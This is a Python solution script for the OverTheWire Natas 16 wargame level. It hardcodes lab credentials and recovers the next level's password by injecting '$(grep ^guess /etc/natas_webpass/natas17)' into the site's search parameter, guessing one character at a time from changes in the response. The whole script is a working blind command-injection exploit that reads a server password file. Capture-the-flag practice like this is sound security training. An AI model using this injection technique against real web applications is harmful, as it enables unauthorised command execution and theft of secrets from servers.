import requests
import string

username = "natas16"
password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

url = "http://natas16.natas.labs.overthewire.org/"
letters = letters=string.ascii_letters+string.digits

natas17=''

while len(natas17)<32:
    for char in letters:
        guess=natas17+char
        payload = f"Africans$(grep ^{guess} /etc/natas_webpass/natas17)"

        response=requests.get(
            url,
            auth=(username,password),
            params={"needle": payload, "submit":"Search"}
        )

        if 'Africans' not in response.text:
            natas17+=char
            print(natas17)
            break
